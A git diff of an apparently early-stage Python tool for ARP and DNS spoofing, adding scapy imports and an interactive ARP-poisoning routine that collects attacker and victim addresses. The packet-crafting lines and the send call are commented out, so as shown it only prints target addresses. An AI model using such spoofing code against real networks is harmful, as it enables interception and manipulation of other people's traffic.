@@ -1,5 +1,7 @@
-import sys, os, argparse
+import sys, os, argparse 
 from util import bcolors
+import scapy
+from scapy.all import *
 
 # Set up argument parser for using arguments in the command line
 parser = argparse.ArgumentParser(
@@ -28,7 +30,50 @@ parser.add_argument(
 
 
 def ARPposioning():
-    print(f'ARP spoofing selected.\n')
+    print(f'a')
+    macAttacker= input("Enter MAC address of attacker: ")  
+    ipAttacker= input("Enter IP address of attacker: ")
+
+    victimNumber=input('Do you want to spoof one or multiple victims? (1/m)')
+    if victimNumber == "1":
+        macVictim= input("Enter MAC address of victim: ")
+        ipVictim= input("Enter IP address of victim: ")
+
+        ipToSpoof= input("Enter IP address to spoof: ")
+        print(ipVictim)
+        # arp=Ether() / ARP()
+        # arp[Ether].src= macAttacker
+        # arp[ARP].hwsrc= macAttacker
+        # arp[ARP].psrc= ipToSpoof
+        # arp[ARP].hwdst= macVictim
+        # arp[ARP].pdst= ipVictim
+        print("\n\n")
+    
+    elif victimNumber == "m":   
+        IPrange=input('What is the range of IP addresses?')
+        IpToSpoof=input('What is the IP address to spoof?')
+        if "-" in IPrange:
+            upperBoundary=IPrange.split("-")[1]
+            lowerBoundary=lowerBoundary=IPrange.split(".")[3].split("-")[0]
+
+            for i in range(int(lowerBoundary), int(upperBoundary)):
+                macVictim= "To be determined"
+                ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
+
+                print(ipVictim)
+                # arp=Ether() / ARP()
+                # arp[Ether].src= macAttacker
+                # arp[ARP].hwsrc= macAttacker
+                # arp[ARP].psrc= ipToSpoof
+                # arp[ARP].hwdst= macVictim
+                # arp[ARP].pdst= ipVictim
+        else:
+            print("Invalid input. Please try again.")
+
+        print("\n\n")
+    
+
+    # sendp(arp, iface="ënp0s3")
 
 def DNSposioning():
     print(f'DNS spoofing selected.\n')
